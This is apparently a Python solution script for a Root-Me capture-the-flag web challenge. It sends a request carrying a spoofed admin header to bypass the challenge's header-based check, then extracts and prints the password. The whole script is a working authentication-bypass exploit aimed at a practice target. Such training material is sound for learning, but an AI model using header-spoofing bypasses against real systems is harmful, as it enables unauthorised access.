import requests

url = "http://challenge01.root-me.org/web-serveur/ch5/"

response = requests.get(url, headers={'Header-RootMe-Admin': 'none'})

content = response.text

start = content.find("password ")+len("password ")
end = content.find("\n", start)
flag = content[start:end]

print(flag)
